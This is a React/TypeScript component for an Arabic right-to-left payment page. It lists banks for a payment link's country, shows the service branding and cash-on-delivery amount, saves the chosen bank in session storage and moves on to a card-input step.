import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { getServiceBranding } from "@/lib/serviceLogos";
import PaymentRouterStandalone from "@/components/PaymentRouterStandalone";
import { Building2, ArrowLeft } from "lucide-react";
import { getBanksByCountry } from "@/lib/banks";

const StandalonePaymentBankSelector = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [selectedBank, setSelectedBank] = useState<string>('');

  return (
    <PaymentRouterStandalone>
      {(linkData) => {
        const serviceKey = linkData.service_key;
        const serviceName = linkData.service_name;
        const branding = getServiceBranding(serviceKey);
        const amount = linkData.cod_amount;
        const formattedAmount = `${amount} ر.س`;
        const countryCode = linkData.country_code;

        const banks = getBanksByCountry(countryCode);

        const handleSelectBank = (bankId: string) => {
          setSelectedBank(bankId);
          sessionStorage.setItem('selectedBank', bankId);
        };

        const handleSkip = () => {
          sessionStorage.setItem('selectedBank', 'skipped');
          navigate(`/standalone-pay/${id}/card-input`);
        };

        const handleProceed = () => {
          if (selectedBank) {
            navigate(`/standalone-pay/${id}/card-input`);
          }
        };

        return (
          <div className="min-h-screen bg-background" dir="rtl">
            <div className="container mx-auto px-3 sm:px-4 py-8">
              <div className="max-w-2xl mx-auto">
                <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
                  <div className="flex items-center justify-between mb-6 sm:mb-8">
                    <h1 className="text-xl sm:text-3xl font-bold">اختيار البنك</h1>
                    <div
                      className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                      style={{
                        background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                      }}
                    >
                      <Building2 className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
                    </div>
                  </div>

                  <p className="text-sm text-muted-foreground mb-6">
                    اختر البنك الذي تريد الدفع من خلالهم
                  </p>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4 mb-6">
                    {banks.map((bank) => (
                      <Card
                        key={bank.id}
                        className={`p-4 cursor-pointer transition-all hover:shadow-lg ${
                          selectedBank === bank.id ? 'ring-2 ring-primary' : ''
                        }`}
                        onClick={() => handleSelectBank(bank.id)}
                        style={{
                          borderTopColor: bank.color,
                        }}
                      >
                        <div className="flex items-center gap-3">
                          <div
                            className="w-12 h-12 rounded-lg flex items-center justify-center"
                            style={{ background: bank.color }}
                          >
                            <Building2 className="w-6 h-6 text-white" />
                          </div>
                          <div>
                            <h3 className="font-semibold text-sm">{bank.nameAr}</h3>
                            <p className="text-xs text-muted-foreground">{bank.name}</p>
                          </div>
                        </div>
                      </Card>
                    ))}
                  </div>

                  <div className="space-y-3">
                    <Button
                      onClick={handleProceed}
                      disabled={!selectedBank}
                      size="lg"
                      className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
                      style={{
                        background: selectedBank
                          ? `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                          : '#666'
                      }}
                    >
                      <span className="ml-2">التالي</span>
                      <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
                    </Button>

                    <Button
                      onClick={handleSkip}
                      variant="outline"
                      size="lg"
                      className="w-full"
                    >
                      تخطي هذه الخطوة
                    </Button>
                  </div>
                </Card>
              </div>
            </div>
          </div>
        );
      }}
    </PaymentRouterStandalone>
  );
};

export default StandalonePaymentBankSelector;
